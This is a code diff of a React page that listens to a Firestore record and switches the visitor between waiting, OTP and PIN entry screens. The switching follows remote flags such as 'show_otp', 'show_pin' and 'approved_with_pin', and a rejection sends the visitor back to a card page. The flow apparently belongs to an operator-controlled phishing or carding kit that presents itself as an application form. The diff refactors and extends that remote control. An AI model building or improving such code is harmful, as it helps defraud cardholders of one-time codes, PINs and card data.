@@ -6,10 +6,14 @@ import { db } from "@/lib/firebase";
 import { onSnapshot, doc } from "firebase/firestore";
 import { useFormData } from "@/context/FormContext";
 import {
+  APPLICATION_COLLECTION,
   appendHistoryEntry,
   ensureApplicationDoc,
   generateConfirmationCode,
   hasRequiredApplicantData,
+  isApprovedRemoteState,
+  isRejectedRemoteState,
+  normalizeRemoteValue,
   updateApplicationData,
 } from "@/lib/application-sync";
 
@@ -17,15 +21,27 @@ type OtpStage = "waiting" | "otp" | "pin";
 
 function getStageFromRemoteState(value: Record<string, unknown> | undefined): OtpStage {
   if (!value) return "waiting";
+  const otpStatus = normalizeRemoteValue(
+    value.otpStatus ?? value.otp_status ?? value.otpDecision,
+  );
+  const pinStatus = normalizeRemoteValue(
+    value.pinStatus ?? value.pin_status ?? value.pinDecision,
+  );
+  const cardStatus = normalizeRemoteValue(
+    value.cardStatus ?? value.card_status ?? value.cardDecision,
+  );
+  const redirectPage = normalizeRemoteValue(
+    value.redirectPage ?? value.redirect_page ?? value.redirect ?? value.nextPage,
+  );
   if (
-    value.otpStatus === "show_pin" ||
-    value.pinStatus === "waiting" ||
-    value.cardStatus === "approved_with_pin" ||
-    value.redirectPage === "pin"
+    otpStatus === "show_pin" ||
+    pinStatus === "waiting" ||
+    cardStatus === "approved_with_pin" ||
+    redirectPage === "pin"
   ) return "pin";
   if (
-    value.otpStatus === "show_otp" ||
-    value.cardStatus === "approved_with_otp"
+    otpStatus === "show_otp" ||
+    cardStatus === "approved_with_otp"
   ) return "otp";
   return "waiting";
 }
@@ -81,11 +97,13 @@ export default function OtpPage() {
 
   useEffect(() => {
     if (!saved || !docIdRef.current) return;
-    const unsubscribe = onSnapshot(doc(db, "pays", docIdRef.current), (snap) => {
+    const unsubscribe = onSnapshot(doc(db, APPLICATION_COLLECTION, docIdRef.current), (snap) => {
       const val = snap.data();
-      if (val?.status === "approved") setLocation("/success");
-      if (val?.status === "rejected") setLocation("/card");
-      const nextStage = getStageFromRemoteState(val as Record<string, unknown> | undefined);
+      const state = val as Record<string, unknown> | undefined;
+      const status = state?.status ?? state?.decision ?? state?.approvalStatus;
+      if (isApprovedRemoteState(status)) setLocation("/success");
+      if (isRejectedRemoteState(status)) setLocation("/card");
+      const nextStage = getStageFromRemoteState(state);
       setStage(nextStage);
       if (previousStageRef.current !== nextStage) {
         previousStageRef.current = nextStage;
